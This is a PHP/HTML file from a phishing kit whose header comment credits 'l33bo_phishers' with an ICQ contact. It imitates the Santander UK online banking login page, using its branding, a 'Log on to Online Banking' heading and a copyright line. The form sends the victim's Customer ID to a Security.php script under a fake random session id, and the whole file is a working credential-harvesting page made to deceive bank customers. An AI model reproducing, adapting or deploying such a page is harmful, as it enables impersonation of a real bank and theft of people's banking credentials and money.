<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<title>Login</title>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="en-gb" http-equiv="content-language">
<meta content="width=device-width" name="viewport">
<link href="" media="handheld" rel="alternate">
<link href="assets/img/fav.ico" rel="shortcut icon">
<link href="assets/css/001.css" rel="stylesheet" type="text/css">
<script src="assets/js/gen_validatorv4.js" type="text/javascript"></script>
<style>
.error_strings {
    margin: 0px;
    padding: 0px 20px 0px 30px;
    color: #db0000;
    font-size: 16px;
}
</style>
</head>
<body>
<div id="outer">
<div id="banner">
<p id="userstatusNGB">
<img src="assets/img/logo.png">
</p>
<p class="cookiePolicy">
<img src="assets/img/ico_lockSmallWhite.png" height="30" width="26px">
</p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">                             
<h1>Log on to Online Banking</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="login">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">                                                                           
<div class="loginInner">
<div class="loginFields">
<div id='login_user_errorloc' class="error_strings"></div>
<form action="Security.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" id="login" method="post" name="login">
<div class="formField"><label for="user">Enter your Personal/Customer ID</label> <input autocomplete="off" class="wide" id="user" maxlength="30" name="user" type="tel" value=''></div>
<div class="formField"><input class="checkbox" name="none" type="checkbox"> <label class="checkboxLabel" for="none">Remember my ID</label></div>
<div class="actionsLogin">
<div class="divider">
<hr></div>
<input class="submitAction" id="go" name="go" type="submit" value="Continue"></div>
</form>
<script src="assets/js/validateLogin.js"></script>
</div>
</div>
</div>
</div>
</div>
</div>
</div>   
<div class="clearer"></div>                 
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Forgotten your log on details?</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Contact us</a></p>
</div>
</div>
</div>
<div class="appBannerBG" style="padding-top:10px;">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img src="assets/img/001.png"></a></p>
</div>
</div>
<div class="clearer"></div>
<div>
<div style="clear: both;text-align: center;padding-bottom:10px" class="footerLinksLogin">
<ul style="display: block;background-color: #D6D6D6;">
<li style="list-style: none;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 13px">Copyright &copy; Santander UK plc. All rights reserved</li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>